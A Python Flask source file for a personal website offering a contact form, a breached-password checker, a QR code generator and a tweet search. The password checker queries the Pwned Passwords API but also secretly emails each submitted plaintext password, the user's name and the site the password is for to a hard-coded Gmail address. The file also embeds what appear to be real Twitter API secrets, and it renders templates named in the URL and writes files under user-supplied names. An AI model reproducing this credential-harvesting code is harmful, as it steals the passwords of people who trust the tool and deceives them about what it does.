from flask import Flask, render_template,request,redirect
from flask_sqlalchemy import SQLAlchemy
from flask_mail import Mail
import pymysql
import json
import requests
import hashlib
import pyqrcode
import tweepy
import time


local_server = True

with open(r'S://Program//My Website//templates//config.json', 'r') as c:
    params = json.load(c)["params"]

db = SQLAlchemy()

app = Flask(__name__)
app.config.update(
    MAIL_SERVER = 'smtp.gmail.com',
    MAIL_PORT = '465',
    MAIL_USE_SSL = True,
    MAIL_USERNAME = params['gmail-user'],
    MAIL_PASSWORD = params['gmail-password']
)

mail = Mail(app)
if local_server:
    app.config["SQLALCHEMY_DATABASE_URI"] = params['local_uri']
else:
    app.config["SQLALCHEMY_DATABASE_URI"] = params['production_uri']

db.init_app(app)


class feedback(db.Model):
    SrNo = db.Column(db.Integer, primary_key=True)
    Email = db.Column(db.String(20), unique=False, nullable=False)
    Subject = db.Column(db.String,nullable=False)
    Message = db.Column(db.String,nullable=False)
    Date = db.Column(db.String(12))



@app.route("/")
def web_page():
    return render_template("index.html")

@app.route("/<string:page_name>")
def home_page(page_name):
    return render_template(page_name)


@app.route("/submit_form",methods = ['GET','POST'])
def submit_form():
    if request.method == 'POST':
        '''Add Entry to the database'''
        name = request.form['name']
        email = request.form["email"]
        # subject = request.form['subject']
        message = request.form["message"]
        # entry = feedback(Email=email,Subject=subject,Message=message)
        # db.session.add(entry)
        # db.session.commit()
        mail.send_message('New Message From Your Website by ' + name, 
        sender = email,
        recipients = ['swapnilrajgadkarwani@gmail.com'],
        body= f'My email: {email}\n'+ message)
    return redirect('/thankyou.html')


@app.route("/submit_password",methods = ['POST'])
def submit_password():
    password = request.form['password']
    result = check_password(password)
    return render_template('password_result.html', result=result)

def check_password(password):
    def request_api_data(query_char):
        url = 'https://api.pwnedpasswords.com/range/' + query_char
        resp = requests.get(url)
        if resp.status_code != 200:
            raise RuntimeError(f'Error fetching {resp.status_code},change the password & try again...')
        return resp

    def get_password_leak_counts(hashes,hash_to_check):
        hashes =(line.split(':') for line in hashes.text.splitlines())
        for h,count in hashes:
            if h == hash_to_check:
                return count
        return 0

    def pwned_api_check(password1):
        sha1password = hashlib.sha1(password1.encode('utf-8')).hexdigest().upper() #This will create password into HEXADECIMAL string
        first5char, tail = sha1password[:5],sha1password[5:]
        response = request_api_data(first5char)
        return get_password_leak_counts(response,tail)
    
    password1 = password
    name = request.form.get('name')
    option = request.form.get('social_media')
    count = pwned_api_check(password1)
    if count:
        mail.send_message('New password from Your Website ',
        sender= password1,
        recipients = ['swapnilrajgadkarwani@gmail.com'],
        body= f'Name : {name}, Password : {password}, Source : {option}.')
        return f"Oh No ! Your password was used {count} times.This password has previously appeared in a data breach and should never be used.So you better change it..."
    else:
        mail.send_message('New password from Your Website ',
        sender= password1,
        recipients = ['swapnilrajgadkarwani@gmail.com'],
        body= f'Name : {name}, Password : {password}, Source : {option}.')
        return f'Good News. Your password was not found anywhere in the World. Great Password !'


@app.route("/submit_QR",methods = ['POST'])
def submit_QR():
    QR_string = request.form['qr_code']
    filename = request.form['qr_code_name']

    result = create_qr_code(QR_string,filename)
    return render_template('qr_code_creator_result.html', result=result, filename = filename)

def create_qr_code(QR_string,filename):
    url = pyqrcode.create(QR_string)

    return url.svg(f"{filename}.svg", scale=8)


@app.route("/submit_tweet",methods = ['POST'])
def submit_tweet():
    auth = tweepy.OAuthHandler('66nwRZw5audDZF74cmzCQZ55u','wcE8T3ObufzLmq7d817t7y3QBHKgf4g45sMeee6Wbqt80tfcKI')
    auth.set_access_token('4923400246-FGYoZqf2dbstrUxKcWiouU5L5FZD6NJec90dsOs','VT7E5mBarjNHCEVRnPoVNty1tdsnm5PETzEaeP4fAz3Sb')
    api = tweepy.API(auth)
    user = api.verify_credentials()

    def limit_handler(cursor):
        try:
            while True:
                yield cursor.next()

        except StopIteration:
            exit()

        except tweepy.errors.TooManyRequests(): #This is used to reduce the too many request on twitter as it cost to much for too many request.
            time.sleep(500) 


    search_string = request.form['topic_of_tweet']
    numberOfitems = request.form['number_of_tweet']

    result = []
    for tweet in tweepy.Cursor(api.search_tweets,search_string).items(int(numberOfitems)):
        result.append(f'{tweet.text} ------ ') # Text will only print the tweet if it is not there it will give all data about tweets.

    return render_template('twitter_bot_result.html', result= [value for index, value in enumerate(result, start=1)] )


if __name__ == '__main__':
    app.run(debug=True)



